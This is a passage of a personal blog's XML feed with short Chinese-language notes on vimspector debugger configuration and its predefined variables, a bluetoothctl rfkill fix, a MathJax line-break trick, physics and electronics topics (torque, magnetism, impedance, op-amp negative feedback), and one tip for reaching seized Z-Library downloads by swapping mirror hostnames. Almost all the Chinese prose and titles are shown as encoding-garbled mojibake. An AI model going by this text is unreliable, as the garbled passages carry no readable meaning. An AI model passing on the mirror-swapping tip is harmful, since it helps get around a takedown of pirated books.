class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;/test.py&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;stopOnEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="æ‰©å±•é…ç½®"><a href="#æ‰©å±•é…ç½®" class="headerlink" title="æ‰©å±•é…ç½®"></a>æ‰©å±•é…ç½®</h3><p>åŒæ ·åˆ©ç”¨ <code>extends</code> æ¥ç»§æ‰¿:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span>  <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;run - simple&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;adapter&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CodeLLDB&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;program&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;/myapp&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;BASEPATH&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">// run with some fixed options</span><br>    <span class="hljs-attr">&quot;run - test mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;extends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;run - simple&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-string">&quot;-mode&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;test&quot;</span> <span class="hljs-punctuation">]</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">// run with some different environment vars</span><br>    <span class="hljs-attr">&quot;run - verbose mode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;extends&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;run - test mode&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;configuration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;env&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;LOGLEVEL&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;verbose&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="é¢„å®šä¹‰å˜é‡"><a href="#é¢„å®šä¹‰å˜é‡" class="headerlink" title="é¢„å®šä¹‰å˜é‡"></a>é¢„å®šä¹‰å˜é‡</h2><p>:</p><ul><li><code>$&#123;dollar&#125;</code> - has the value $, can be used to enter a literal dollar</li><li><code>$$</code> - a literal dollar</li><li><code>$&#123;workspaceRoot&#125;</code> - the path of the folder where .vimspector.json was found</li><li><code>$&#123;workspaceFolder&#125;</code> - the path of the folder where .vimspector.json was found</li><li><code>$&#123;gadgetDir&#125;</code> - path to the OS-specific gadget dir (<vimspector home>&#x2F;gadgets&#x2F;<OS>)</li><li><code>$&#123;file&#125;</code> - the current opened file</li><li><code>$&#123;relativeFile&#125;</code> - the current opened file relative to workspaceRoot</li><li><code>$&#123;relativeFileDirname&#125;</code> - path of opened file relative to workspaceRoot</li><li><code>$&#123;fileBasename&#125;</code> - the current opened fileâ€™s basename</li><li><code>$&#123;fileBasenameNoExtension&#125;</code> - the current opened fileâ€™s basename with no file extension</li><li><code>$&#123;fileDirname&#125;</code> - the current opened fileâ€™s dirname</li><li><code>$&#123;fileExtname&#125;</code> - the current opened fileâ€™s extension</li><li><code>$&#123;cwd&#125;</code> - the current working directory of the active window on launch</li><li><code>$&#123;unusedLocalPort&#125;</code> - an unused local TCP port</li></ul>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æš‚æ—¶è§£å†³-fluid-ä¸»é¢˜-æ•°å­¦å…¬å¼æ¢è¡Œé—®é¢˜</title>
    <link href="/2022/11/28/%E6%9A%82%E6%97%B6%E8%A7%A3%E5%86%B3-fluid-%E4%B8%BB%E9%A2%98-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%8D%A2%E8%A1%8C%E9%97%AE%E9%A2%98/"/>
    <url>/2022/11/28/%E6%9A%82%E6%97%B6%E8%A7%A3%E5%86%B3-fluid-%E4%B8%BB%E9%A2%98-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E6%8D%A2%E8%A1%8C%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>\displaylines&#123;&#125;</code>, ç„¶åæŠŠæ‰€æœ‰ä»£ç å†™åœ¨å…¶ä¸­.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>perlbrew-çš„ä½œç”¨</title>
    <link href="/2022/11/27/perlbrew-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/11/27/perlbrew-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-bluetoothctl-æŠ¥é”™-NotReady-ä»¥åŠ-adapter-not-powered</title>
    <link href="/2022/11/27/%E5%85%B3%E4%BA%8E-bluetoothctl-%E6%8A%A5%E9%94%99-NotReady-%E4%BB%A5%E5%8F%8A-adapter-not-powered/"/>
    <url>/2022/11/27/%E5%85%B3%E4%BA%8E-bluetoothctl-%E6%8A%A5%E9%94%99-NotReady-%E4%BB%A5%E5%8F%8A-adapter-not-powered/</url>
    
    <content type="html"><![CDATA[<p>æŠ¥é”™æç¤ºå¦‚ä¸‹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">Failed to connect: org.bluez.Error.NotReady br-connection-adapter-not-powered<br></code></pre></td></tr></table></figure><p>åŸå› ä¸º <code>rfkill</code> ä¸­è¢« block, ä½¿ç”¨:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ rfkill unblock all<br></code></pre></td></tr></table></figure><p>è§£å†³.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript-DOM-ç¼–ç¨‹è‰ºæœ¯-Notes</title>
    <link href="/2022/11/26/JavaScript-DOM-%E7%BC%96%E7%A8%8B%E8%89%BA%E6%9C%AF-Notes/"/>
    <url>/2022/11/26/JavaScript-DOM-%E7%BC%96%E7%A8%8B%E8%89%BA%E6%9C%AF-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« "><a href="#ç¬¬1ç« " class="headerlink" title="ç¬¬1ç« "></a>ç¬¬1ç« </h1>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>zlib-æŸ¥å°åä¹¦ç±ä¸‹è½½æ–¹æ³•</title>
    <link href="/2022/11/26/zlib-%E6%9F%A5%E5%B0%81%E5%90%8E%E4%B9%A6%E7%B1%8D%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/"/>
    <url>/2022/11/26/zlib-%E6%9F%A5%E5%B0%81%E5%90%8E%E4%B9%A6%E7%B1%8D%E4%B8%8B%E8%BD%BD%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>å…ˆé€šè¿‡ â€œ<a href="https://search.v4.zhelper.net/&quot;">https://search.v4.zhelper.net/&quot;</a> è¿™ä¸ªç½‘ç«™æŸ¥æ‰¾ä¹¦ç±ï¼Œç‚¹å‡»ä¹¦ååçš„ url å¦‚: â€œ<a href="https://search.v4.zhelper.net/download/5281016/64e692&quot;">https://search.v4.zhelper.net/download/5281016/64e692&quot;</a>, ä¹‹åæŠŠ â€œsearch.v4.zhelper.netâ€ æ”¹ä¸ºå¦‚ â€œtest1.zlib.downloadâ€ï¼Œæœ€ç»ˆä¸º â€œ<a href="https://test1.zlib.download/download/5281016/64e692&quot;">https://test1.zlib.download/download/5281016/64e692&quot;</a> å³å¯ä¸‹è½½.</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>å¦‚ä½•ç†è§£ç‰©ç†ä¸­çš„-moment</title>
    <link href="/2022/11/26/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E7%89%A9%E7%90%86%E4%B8%AD%E7%9A%84-moment/"/>
    <url>/2022/11/26/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E7%89%A9%E7%90%86%E4%B8%AD%E7%9A%84-moment/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=NueuPY2Yqq4">å‚è€ƒ YouTube1</a></p><p>å½“ä½ è½¬åŠ¨ä¸€ä¸ªç‰©ä½“æ—¶ï¼Œéœ€è¦ä¸€ä¸ªåŠ› (force) ä»¥åŠä¸€ä¸ªæ”¯ç‚¹ (pivot point), è€Œå½“ä½ æ–½åŠ çš„åŠ›ç¦»ç‰©ä½“è¾ƒè¿œæ—¶ï¼Œä½ ä¼šæ„Ÿè§‰åˆ°æ›´å®¹æ˜“ï¼Œå› æ­¤éœ€è¦ä¸€ä¸ªé‡æ¥æè¿°è¿™ç§ç”± force å’Œ distance å…±åŒå½±å“è½¬åŠ¨çš„éš¾æ˜“ç¨‹åº¦:<br>$$<br>moment &#x3D; force \times distance<br>$$</p><p>è¿™å°±æ˜¯ moment çš„å®šä¹‰ä»¥åŠä¸ºä»€ä¹ˆéœ€è¦ moment. è¿™ä¸ª moment ä¹Ÿå¯ä»¥ç§°ä¸º torque.</p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç£æ€§çš„ç”±æ¥</title>
    <link href="/2022/11/26/%E7%A3%81%E6%80%A7%E7%9A%84%E7%94%B1%E6%9D%A5/"/>
    <url>/2022/11/26/%E7%A3%81%E6%80%A7%E7%9A%84%E7%94%B1%E6%9D%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒçŸ¥ä¹1"><a href="#å‚è€ƒçŸ¥ä¹1" class="headerlink" title="å‚è€ƒçŸ¥ä¹1"></a><a href="https://www.zhihu.com/question/38879132/answer/81035171">å‚è€ƒçŸ¥ä¹1</a></h1><p>ç£åœºçš„äº§ç”Ÿå¯ä»¥åˆ†ä¸ºä¸¤ç§:</p><ul><li>è¿åŠ¨ç”µæµ (å˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœº)</li><li>åŸºæœ¬ç²’å­çš„è‡ªæ—‹</li></ul><p>æ‰€æœ‰ç‰©è´¨éƒ½æœ‰ç£æ€§ï¼Œåªæ˜¯å¤§å°ä¸åŒ.</p><p>æµ…æ˜¾çš„è®¤çŸ¥: ä¸å®¹æ˜“è¢«ç£åŒ–çš„ç‰©è´¨ï¼Œå…¶å†…éƒ¨çš„åŸå­éš¾ä»¥å—å¤–éƒ¨ç£åœºçš„å½±å“è€Œæ’åˆ—æ•´é½.</p><p>ç£åŠ›çš„å­˜åœ¨æ˜¯ç”±äºç£åœº.</p><h1 id="å‚è€ƒ-YouTube"><a href="#å‚è€ƒ-YouTube" class="headerlink" title="å‚è€ƒ YouTube"></a><a href="https://www.youtube.com/watch?v=MRqQQGO7Xe8">å‚è€ƒ YouTube</a></h1><p>è´¨å­å’Œç”µå­çš„è‡ªæ—‹:<br><img src="/../img/self_rotate_of_proton_and_electron.png"></p><p>è‡ªæ—‹å’Œç”µå­ç»•æ ¸æ—‹è½¬éƒ½ä¼šäº§ç”Ÿç”µæµ:<br><img src="/../img/current_made_by_self_rotate_indecate_mag.png"></p><p>å¦‚è¿™å¼ å›¾ï¼Œè¿™ä¸‰ä¸ªç£åœºå‘é‡åˆå‘é‡å°±æ˜¯è¿™ä¸ªç²’å­çš„ç£åœºæ–¹å‘.</p><h2 id="åŒä¸€æ–¹å‘"><a href="#åŒä¸€æ–¹å‘" class="headerlink" title="åŒä¸€æ–¹å‘"></a>åŒä¸€æ–¹å‘</h2><p>å¦‚æœæ‰€æœ‰çš„ç²’å­çš„ç£åœºå‘é‡éƒ½ä½äºä¸€ä¸ªæ–¹å‘:<br><img src="/../img/vector_in_the_same_direction.png"></p><p>é‚£ä¹ˆå…¶åˆå‘é‡å°±å¾ˆå¤§. ç‰©ä½“å°±ä¼šè¡¨ç°å‡ºç£æ€§.</p><h2 id="ä¸åŒæ–¹å‘"><a href="#ä¸åŒæ–¹å‘" class="headerlink" title="ä¸åŒæ–¹å‘"></a>ä¸åŒæ–¹å‘</h2><p>å¦‚æœå„ä¸ªç²’å­çš„å‘é‡æ–¹å‘ä¸åŒï¼Œé‚£ä¹ˆå°±ä¼šæœ‰ç‹ å¤šè¢«æŠµæ¶ˆæ‰:<br><img src="/../img/vectors_in_different_direction.png"></p><p>ç‰©ä½“çš„ç£æ€§å°±ä¸ä¼šè¡¨ç°å‡º.</p><h2 id="æ–½åŠ å¤–éƒ¨ç£åœº"><a href="#æ–½åŠ å¤–éƒ¨ç£åœº" class="headerlink" title="æ–½åŠ å¤–éƒ¨ç£åœº"></a>æ–½åŠ å¤–éƒ¨ç£åœº</h2><p>æ–½åŠ ä¸€ä¸ªå¤–éƒ¨ç£åœºï¼Œå¯èƒ½ä½¿ç‰©ä½“å†…ç²’å­äº§ç”Ÿçš„ç£åœºå‘é‡æ–¹å‘æ’åˆ—æ•´é½ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆé“å—åœ¨é ç»ä¸€å—ç£é“ä½¿å°±å…·æœ‰äº†ç£æ€§:</p><p><img src="/../img/outer_magnetic_field_adjust_the_vectors_direction.png"></p><h2 id="ç›¸å…³æ•°å­¦å…¬å¼"><a href="#ç›¸å…³æ•°å­¦å…¬å¼" class="headerlink" title="ç›¸å…³æ•°å­¦å…¬å¼"></a>ç›¸å…³æ•°å­¦å…¬å¼</h2><p><img src="/../img/related_mathmatic_equations_in_why_there_is_a_magnetism.png"></p>]]></content>
    
    
    <categories>
      
      <category>Physics</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Learn-JavaScript_by_Example-Notes</title>
    <link href="/2022/11/25/Learn-JavaScript-by-Example-Notes/"/>
    <url>/2022/11/25/Learn-JavaScript-by-Example-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="å…³äº-delete"><a href="#å…³äº-delete" class="headerlink" title="å…³äº delete"></a>å…³äº delete</h1>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”µé˜»å’Œé˜»æŠ—</title>
    <link href="/2022/11/25/%E7%94%B5%E9%98%BB%E5%92%8C%E9%98%BB%E6%8A%97/"/>
    <url>/2022/11/25/%E7%94%B5%E9%98%BB%E5%92%8C%E9%98%BB%E6%8A%97/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒçŸ¥ä¹1"><a href="#å‚è€ƒçŸ¥ä¹1" class="headerlink" title="å‚è€ƒçŸ¥ä¹1"></a><a href="https://zhuanlan.zhihu.com/p/55749598">å‚è€ƒçŸ¥ä¹1</a></h1><h2 id="ç”µé˜»"><a href="#ç”µé˜»" class="headerlink" title="ç”µé˜»"></a>ç”µé˜»</h2><p>resistance, æè¿°çš„æ˜¯ä¸€ä¸ªå™¨ææˆ–ææ–™å¯¹æµè¿‡å…¶ä¸­çš„ç”µæµçš„é˜»ç¢ä½œç”¨, å…¶æœ¬è´¨æ˜¯å°†ç”µèƒ½è½¬æ¢ä¸ºå…¶ä»–å½¢å¼çš„èƒ½ã€‚</p><p>è®¡ç®—ç”µé˜»æ˜¯:<br>$$<br>R &#x3D; \frac{U}{I}<br>$$</p><h2 id="é˜»æŠ—"><a href="#é˜»æŠ—" class="headerlink" title="é˜»æŠ—"></a>é˜»æŠ—</h2><p>impedance, å…¶åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†:</p><ul><li>é˜»æ€§, resistivity, å°†ç”µèƒ½è½¬æ¢ä¸ºçƒ­èƒ½</li><li>å®¹æ€§, capacity, ä»¥ç©ºé—´æˆ–ç”µä»‹è´¨å†…çš„ç”µåœºå½¢å¼å‚¨å­˜ç”µèƒ½, è¿™é‡Œçš„ â€œå®¹â€ æŒ‡çš„æ˜¯ç”µå®¹ï¼Œææ¿é—´æ˜¯ç”µåœº</li><li>æ„Ÿæ€§, sensibility, ä»¥ç©ºé—´æˆ–ç£ä»‹è´¨å†…çš„ç£åœºå‚¨å­˜ç”µèƒ½, è¿™é‡Œçš„ â€œæ„Ÿâ€ æŒ‡çš„æ˜¯æ„Ÿåº”ç£åœº</li></ul><p>ä¸ºä»€ä¹ˆæ˜¯ â€œæŠ—â€, ä¸ç®¡æ˜¯è½¬æ¢ä¸ºå…¶ä»–èƒ½è¿˜æ˜¯å­˜å‚¨ç”µèƒ½ï¼Œéƒ½å¯¹ç”µæµçš„ç§»åŠ¨æœ‰é˜»ç¢ä½œç”¨.</p><p>è®¡ç®—åŒæ ·æ˜¯ç”¨ç¬æ—¶ç”µå‹é™¤ä»¥ç”µæµ.</p><p>ä½†å…¶è¡¨è¾¾å¼æ˜¯å¤æ•°:<br>$$<br>Z &#x3D; R + jX<br>$$</p><h1 id="å‚è€ƒçŸ¥ä¹2"><a href="#å‚è€ƒçŸ¥ä¹2" class="headerlink" title="å‚è€ƒçŸ¥ä¹2"></a><a href="https://www.zhihu.com/question/320087849/answer/651969887">å‚è€ƒçŸ¥ä¹2</a></h1><p>é˜»æŠ—æ˜¯ç”µé˜»+ç”µæŠ—.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è¿ç®—æ”¾å¤§å™¨</title>
    <link href="/2022/11/25/%E8%BF%90%E7%AE%97%E6%94%BE%E5%A4%A7%E5%99%A8/"/>
    <url>/2022/11/25/%E8%BF%90%E7%AE%97%E6%94%BE%E5%A4%A7%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-B-ç«™1"><a href="#å‚è€ƒ-B-ç«™1" class="headerlink" title="å‚è€ƒ B ç«™1"></a><a href="https://www.bilibili.com/video/BV1yK411V75K/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™1</a></h1><p>è¿ç®—æ”¾å¤§å™¨æ˜¯ä¸€ä¸ªé›†æˆæœŸé—´ï¼Œå®ƒæ˜¯ç”±è¯¸å¤šæ™¶ä½“å™¨ä»¶ (å¦‚æ™¶ä½“ç®¡) æ‰€æ„æˆ.</p><p>ä»å¤–éƒ¨ç‰¹æ€§æ¥çœ‹ï¼Œè¿ç®—æ”¾å¤§å™¨æ˜¯ä¸€ä¸ªå…·æœ‰:</p><ul><li>ä¸‰ä¸ªä¿¡å·ç«¯å­</li><li>ä¸¤ä¸ªç”µæºç«¯å­<br>çš„å™¨ä»¶.</li></ul><p>å®ƒæœ‰:</p><ul><li>ä¸¤ä¸ªå…·æœ‰é«˜è¾“å…¥ç”µé˜»çš„ç”µå‹ä¿¡å·è¾“å…¥ç«¯.</li><li>ä¸€ä¸ªå…·æœ‰ä½è¾“å‡ºç”µé˜»çš„ç”µå‹ä¿¡å·è¾“å‡ºç«¯</li><li>æ­£è´Ÿä¸¤ä¸ªç”µæºç«¯</li></ul><p><img src="/../img/amplifier_structure.png"></p><p>éœ€è¦æ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰è¿ç®—æ”¾å¤§å™¨çš„è¾“å…¥ç«¯éƒ½å…·æœ‰é«˜è¾“å…¥ç”µé˜».</p><h1 id="å‚è€ƒ-B-ç«™2"><a href="#å‚è€ƒ-B-ç«™2" class="headerlink" title="å‚è€ƒ B ç«™2"></a><a href="https://www.bilibili.com/video/BV14r4y117rC/?spm_id_from=333.788.recommend_more_video.2&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™2</a></h1><p>æ”¾å¤§å™¨å¯ä»¥å°†ä¿¡å·æ”¾å¤§, ä¸ºä»€ä¹ˆåˆå«è¿ç®—æ”¾å¤§å™¨? æ˜¯ç”±äºå…¶å¸¸è¢«ç”¨æ¥æ¨¡æ‹ŸåŠ , å‡, å¾®åˆ†ï¼Œç§¯åˆ†è¿ç®—ã€‚</p><p>æ”¾å¤§å™¨ä¸­çš„ç”µæºå’Œè¾“å…¥æ˜¯ä»€ä¹ˆåŒºåˆ«?<br>è‡ªå·±ç®€å•ç†è§£ä¸ºï¼Œæ”¾å¤§å™¨æ˜¯ä¸€ä¸ªç®€åŒ–çš„ç”µè·¯ (ä¸æ˜¯è¯´ç»“æ„ç®€å•ï¼Œè€Œæ˜¯å°è£…çš„å«ä¹‰ï¼Œå†…éƒ¨çš„ç”µæºç»†èŠ‚æ²¡æœ‰å±•ç°å‡ºæ¥), å…¶å†…éƒ¨çš„ç”µè·¯éœ€è¦ä¾›ç”µ.<br>å¦‚ 741 æ”¾å¤§å™¨çš„å†…éƒ¨ç”µè·¯:<br><img src="/../img/741_ope_amp_structure.png"></p><h1 id="å‚è€ƒ-B-ç«™3"><a href="#å‚è€ƒ-B-ç«™3" class="headerlink" title="å‚è€ƒ B ç«™3"></a><a href="https://www.bilibili.com/video/BV14E411i76t/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™3</a></h1><p>è¿ç®—æ”¾å¤§å™¨çš„è¾“å…¥ç«¯æ°¸è¿œæ²¡æœ‰ç”µæµ (è¾“å…¥å’Œè¾“å‡ºç”µæµéƒ½æ²¡æœ‰), è¾“å‡ºç«¯å¯ä»¥æœ‰ç”µæµçš„è¾“å…¥å’Œè¾“å‡º:<br><img src="/../img/no_current_at_input_of_ope_amp.png"></p><p>ä»è¾“å‡ºç«¯æµå…¥æˆ–æµå‡ºçš„ç”µæµç”±è¿ç®—æ”¾å¤§å™¨çš„ä¾›ç”µç«¯æä¾›.<br><img src="/../img/current_come_from_source.png"></p><p>ç»™è¿ç®—æ”¾å¤§å™¨ä¾›ç”µçš„ä¸¤ä¸ªç«¯å­é€šå¸¸æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥.</p><p>è¿ç®—æ”¾å¤§å™¨äº§ç”Ÿçš„ output voltage çš„å¤§å°åœ¨ä¸¤ä¸ªç”µå‹ç«¯å­æä¾›çš„ç”µå‹ä¹‹é—´.</p><p>è¿ç®—æ”¾å¤§å™¨å°†å¸¦ â€œ+â€ å·ä¸€ç«¯çš„è¾“å…¥ç«¯ç”µå‹ä¸å¸¦ â€œ-â€œ å·ä¸€ç«¯çš„è¾“å…¥ç”µå‹ç›¸å‡:<br><img src="/../img/ope_amp_two_input_minus_each_other.png"></p><p>è¿ç®—æ”¾å¤§å™¨ä¼šç”¨è¿™ä¸ªå·®å€¼æ¥ä¹˜ä»¥ä¸€ä¸ªéå¸¸å¤§çš„æ•°å­—ï¼Œå¾—åˆ°äº†ä¸€ä¸ªç»“æœ:<br>$$<br>\Delta V \times k (a\ big\ num)&#x3D; result<br>$$<br>è¿ç®—æ”¾å¤§å™¨è¾“å‡ºçš„ç”µå‹å°±ä¼šç­‰äºè¿™ä¸ªç»“æœçš„å€¼.</p><p>è¿™æ„å‘³ç€:</p><ul><li>å¦‚æœ Vin+ &lt; Vin-, ç»“æœä¸ºè´Ÿæ•°, è¾“å‡ºç”µå‹å°±ä¸ºä¸€ä¸ªæå¤§çš„è´Ÿç”µå‹</li><li>å¦‚æœ Vin+ &gt; Vin-, ç»“æœä¸ºæ­£æ•°, è¾“å‡ºç”µå‹å°±ä¸ºä¸€ä¸ªæå¤§çš„æ­£ç”µå‹</li></ul><p>è¿™é‡Œéœ€è¦ä¸€ä¸ªç§°ä¸º negative feedback (è´Ÿåé¦ˆ) çš„æ¦‚å¿µ. å¦‚:<br><img src="/../img/negative_feedback_of_ope_amp.png"></p><p>è¿™ä¸¤ä¸ªç”µé˜»ï¼Œä½¿å¾—äº§ç”Ÿçš„è¾“å‡ºç”µå‹çš„ä¸€éƒ¨åˆ†åˆåŠ å›åˆ° â€œ-â€œ ä¸€ç«¯çš„è¾“å…¥ç«¯.</p><p>è¿™æ—¶è€ƒè™‘: </p><p>è‹¥ â€œ+â€ è¾“å…¥ç«¯ç”µå‹å˜å¾—ä½äº â€œ-â€œ è¾“å…¥ç«¯ç”µå‹ï¼Œé‚£ä¹ˆè¾“å‡ºç«¯çš„ç”µå‹ä¼šä¸‹é™ï¼Œä»è¾“å‡ºç«¯åŠ å›åˆ° â€œ-â€œ è¾“å…¥ç«¯çš„ç”µå‹å°±ä¼šä¸‹é™ï¼Œç›´åˆ° â€œ-â€œ è¾“å…¥ç«¯å‡ ä¹ä¸ â€œ+â€ è¾“å…¥ç«¯æ°å¥½ç›¸ç­‰, è¾“å‡ºç”µå‹å°†åœæ­¢ä¸‹é™.</p><p><img src="/../img/plug_terminal_lower_than_minus_terminal.png"></p><p>åˆå‡è®¾ â€œ+â€ è¾“å…¥ç«¯çš„ç”µå‹é«˜äº â€œ-â€œ è¾“å…¥ç«¯, è¿™ä¼šä½¿æ”¾å¤§å™¨å°†è¾“å‡ºç”µå‹å¢å¤§ï¼Œ è¿™åŒæ—¶ä¼šä½¿ â€œ-â€œ è¾“å…¥ç«¯çš„ç”µå‹å¢å¤§ï¼Œç›´åˆ°å…¶ç­‰äº â€œ+â€ è¾“å…¥ç«¯çš„ç”µå‹å¤§å°.</p><p><mark>æ€»ç»“,</mark> è´Ÿåé¦ˆçš„å­˜åœ¨æ€»æ˜¯è¿«ä½¿è¿ç®—æ”¾å¤§å™¨çš„ä¸¤ä¸ªè¾“å…¥ç«¯å­å§‹ç»ˆå¤„äºå‡ ä¹ç›¸åŒçš„ç”µå‹å€¼. ä¸€æ—¦è¿ç®—æ”¾å¤§å™¨çš„ä¸¤ä¸ªè¾“å…¥ç«¯å­çš„ç”µå‹å‡ ä¹è¾¾åˆ°ç›¸åŒçš„å€¼ï¼Œä»–ä»¬ä¹‹é—´çš„å·®å€¼å°±æ˜¯ä¸€ä¸ªéå¸¸å°çš„æ•°å­—ï¼Œå› æ­¤è¾“å‡ºç”µå‹å°±ä¼šæ˜¯è¿™ä¸ªéå¸¸å°çš„æ•°å­—ä¹˜ä»¥ä¸€ä¸ªéå¸¸å¤§çš„æ•°å­—.</p><p>çœ‹è¿™ä¸€ä¸ªæƒ…å†µ:<br><img 